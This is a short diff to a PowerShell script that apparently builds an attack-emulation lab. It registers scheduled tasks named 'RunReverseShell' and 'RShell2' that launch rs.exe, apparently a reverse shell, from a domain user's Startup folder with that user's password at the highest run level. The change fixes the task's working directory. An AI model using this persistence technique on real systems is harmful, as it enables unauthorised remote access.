@@ -1287,6 +1287,7 @@ Write-Output "[+] Emulating RS running under candice..."
 schtasks /create /tn "RunReverseShell" /tr "'C:\Users\candice.kevin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\rs.exe'" /sc ONCE /st 23:59 /ru "ODOMAIN\candice.kevin" /rp "`$Password"  /RL HIGHEST  /F 
 
 `$Path = "C:\Users\candice.kevin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\rs.exe"
+`$PathDir = "C:\Users\candice.kevin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 `$task = Get-ScheduledTask -TaskName "RunReverseShell"
 `$newAction = New-ScheduledTaskAction -Execute `$Path 
 Set-ScheduledTask -TaskName "RunReverseShell" -Action `$newAction -Trigger `$task.Triggers -User 'ODOMAIN\candice.kevin' -Password `$Password
@@ -1296,7 +1297,7 @@ schtasks /run /tn "RunReverseShell"
 
 # attempt 2
 Write-Output "[+] Attempt 2: Emulating RS running under candice..."
-`$action2 = New-ScheduledTaskAction  -Execute rs.exe  -WorkingDirectory `$Path
+`$action2 = New-ScheduledTaskAction  -Execute rs.exe  -WorkingDirectory `$PathDir
 Register-ScheduledTask -TaskName "RShell2" -Action `$action2 -User "ODOMAIN\candice.kevin" -Password `$Password.
 start-sleep 2
 Start-ScheduledTask -TaskName "RShell2"
